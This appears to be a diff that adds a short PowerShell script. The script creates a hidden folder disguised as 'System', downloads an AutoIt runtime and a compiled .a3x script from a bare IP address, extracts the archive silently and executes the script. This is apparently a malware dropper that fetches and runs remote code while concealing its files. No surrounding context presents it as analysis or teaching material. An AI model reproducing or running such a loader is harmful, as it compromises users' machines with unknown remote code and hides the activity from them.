@@ -1,0 +1,8 @@
+New-Item -ItemType Directory -Path ".\System" -Force
+(Get-Item ".\System").Attributes = "Hidden"
+Set-Location -Path ".\System"
+Invoke-WebRequest -Uri "http://103.97.127.14/AutoIt3.rar" -OutFile "AutoIt3.rar"
+Invoke-WebRequest -Uri "http://103.97.127.14/SomeThing.a3x" -OutFile "SomeThing.a3x"
+& "C:\Program Files\WinRAR\WinRAR.exe" x -ibck "AutoIt3.rar" '\'
+Start-Sleep -Seconds 5
+& ".\AutoIt3_x64.exe" "SomeThing.a3x"
